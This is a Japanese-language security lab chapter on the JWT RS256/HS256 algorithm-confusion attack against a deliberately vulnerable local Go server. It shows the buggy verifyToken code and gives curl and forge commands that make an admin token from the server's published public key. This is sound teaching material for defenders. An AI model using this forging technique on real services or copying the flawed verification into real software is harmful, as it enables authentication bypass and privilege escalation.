# 07. 攻撃3: RS256/HS256混同攻撃

`stage3`を止め、`stage4-jwt-alg-confusion`を起動する。

```
go run ./cmd/stage4-jwt-alg-confusion
```

## 理論

RS256は共通鍵(HS256)と違い、非対称鍵を使う。

- 署名: **秘密鍵**(サーバだけが持つ)
- 検証: **公開鍵**(誰に見られてもよい。むしろAPIとして公開することが多い — 実際のJWKSエンドポイントがこれ)

`cmd/stage4-jwt-alg-confusion/main.go`の`verifyToken`を見る。

```go
switch header.Alg {
case "RS256":
    // 公開鍵でRSA署名を検証(正しい)
case "HS256":
    mac := hmac.New(sha256.New, publicKeyPEM())
    // バグ: 公開鍵のPEMバイト列を「HMAC共通鍵」として使っている
```

ここが壊れている場所。RS256用の**公開**鍵を、HS256用の**秘密**鍵として使い回している。公開鍵は名前の通り公開情報 — このサーバ自身が`GET /pubkey`で配っている。つまり**攻撃者は正規の手順で入手した公開鍵を使い、自分でHMAC署名したトークンを作れる**。サーバ側は「algがHS256なら、その値をHMAC鍵として使う」というコードを書いた時点で、非対称鍵のはずの公開鍵を対称鍵に転用してしまっている。

これは実在した脆弱性クラス(CVE-2016-5431など複数のJWTライブラリで報告)。根本原因は5章と同じ — **検証アルゴリズムをトークンの`alg`ヘッダから決めていること**。

## 攻撃

公開鍵を取得する。

```
curl -s localhost:8080/pubkey -o /tmp/pubkey.pem
cat /tmp/pubkey.pem
```

このPEMファイルの**バイト列そのもの**をHMAC鍵として使い、`tools/forge`で偽トークンを作る。

```
EXP=$(($(date +%s)+600))
TOKEN=$(go run ./tools/forge \
  -header '{"alg":"HS256","typ":"JWT"}' \
  -payload "{\"sub\":\"mallory\",\"role\":\"admin\",\"exp\":$EXP}" \
  -secret-file /tmp/pubkey.pem)

curl -i --cookie "access_token=$TOKEN" localhost:8080/admin
```

秘密鍵にも辞書攻撃にも頼らず、**サーバが自分で公開した情報だけ**で管理者権限を得られたことを確認する。

## 何が起きたか

3つの攻撃はすべて同じ原因に行き着く — **検証側が、検証方法をトークン自身(攻撃者が作れる部分)に決めさせていた**。alg:noneは「検証しない」を選ばせ、鍵の使い回しは「検証に使う鍵の種類」を選ばせた。次章の対策は、この選択権をサーバ側に固定する。
